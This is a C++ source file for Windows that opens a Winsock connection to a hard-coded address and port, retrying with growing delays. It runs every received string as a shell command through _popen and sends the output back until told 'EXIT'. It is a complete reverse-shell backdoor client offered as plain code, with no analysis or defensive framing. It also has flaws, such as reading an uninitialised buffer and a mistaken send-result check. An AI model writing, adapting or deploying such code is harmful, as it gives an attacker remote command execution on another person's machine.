#include <iostream>
#include <winsock2.h>
#include<windows.h>
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    result += "\n";
    return result;
}

using namespace std;

char szServerIPAddr[] = "127.0.0.1";
int nServerPort = 5050;  

bool InitWinSock2_0();
using namespace std;

int main()
{
    if (!InitWinSock2_0())
    {
        // It can't start Windows Socket environment
        return -1 ;
    }

    SOCKET hClientSocket;
    hClientSocket = socket(
        AF_INET,
        SOCK_STREAM,
        0          
    );

    if (hClientSocket == INVALID_SOCKET)
    {
        //It is unable to create Server socket
        WSACleanup() ;
        return -1 ;
    }

    struct sockaddr_in serverAddr;

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(szServerIPAddr);
    serverAddr.sin_port = htons(nServerPort);

    int s = 10; 
    while(connect(hClientSocket, (struct sockaddr *) &serverAddr, sizeof(serverAddr)) < 0){
        //It is unable to connect to the server so it will retry
        Sleep(s*1000);
        s *= 2;
    }

    char szBuffer[1024];

    while (strcmp(szBuffer, "EXIT") != 0)
    {
        int nLength = strlen(szBuffer);

        nLength = recv( hClientSocket, szBuffer, sizeof(szBuffer), 0 ) ;
        if (nLength > 0)
        {
            szBuffer[nLength] = '\0' ;
            string r = exec(string(szBuffer).c_str());
            int n = r.length();
            char result[n + 1];
            strcpy(result, r.c_str());

            int nLength = strlen(result);

            int nCntSend = 0;
            char *pBuffer = result;

            nCntSend = send(hClientSocket, pBuffer, nLength, 0) != nLength; 
            if (nCntSend == -1) break;
            if (nCntSend == nLength) cout << "Enviado correctamente" << endl;

        }
    }

    closesocket(hClientSocket);
    WSACleanup() ;
    return 0 ;
}

bool InitWinSock2_0()
{
    WSADATA wsaData ;
    WORD wVersion = MAKEWORD(2, 0) ;

    if (!WSAStartup(wVersion, &wsaData)) return true;
    return false;
}
